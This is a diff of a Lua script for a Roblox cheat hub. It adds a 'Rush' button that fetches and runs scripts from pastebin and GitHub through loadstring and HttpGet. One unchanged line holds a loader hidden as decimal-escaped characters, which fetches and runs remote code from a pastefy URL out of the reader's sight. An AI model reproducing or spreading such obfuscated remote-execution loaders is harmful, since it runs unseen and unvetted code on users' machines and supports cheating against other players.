@@ -969,8 +969,6 @@ if R6() then
 loadstring(game:HttpGet(('https://pastebin.com/raw/r0p74xjX'),true))()
 loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\39\104\116\116\112\115\58\47\47\112\97\115\116\101\102\121\46\103\97\47\107\65\73\71\111\97\108\117\47\114\97\119\39\41\44\116\114\117\101\41\41\40\41\10")()
 
-loadstring(game:HttpGet(('https://pastebin.com/raw/r0p74xjX'),true))()
-
 game:GetService("StarterGui"):SetCore("SendNotification", { 
 	Title = "Script:";
 	Text = "Successfully Executed Runner!";
@@ -985,7 +983,25 @@ Duration = 16;
 end
 end)
 
-NameScript_3.Text = "Script Soon"
+NameScript_3.Text = "Rush"
+Script3.MouseButton1Down:connect(function()
+if R6() then
+loadstring(game:HttpGet(('https://pastebin.com/raw/r0p74xjX'),true))()
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/testforshiistuff/Scripts/main/Rush'),true))()
+
+game:GetService("StarterGui"):SetCore("SendNotification", { 
+	Title = "Script:";
+	Text = "Successfully Executed Rush!";
+	Icon = "rbxthumb://type=Asset&id=9408318893&w=150&h=150"})
+Duration = 16;
+elseif not R6() then
+game:GetService("StarterGui"):SetCore("SendNotification", { 
+	Title = "Notice:";
+	Text = "This Script Only Works On R6 Games!";
+	Icon = "rbxthumb://type=Asset&id=9408318893&w=150&h=150"})
+Duration = 16;
+end
+end)
 
 NameScript_4.Text = "Script Soon"
 
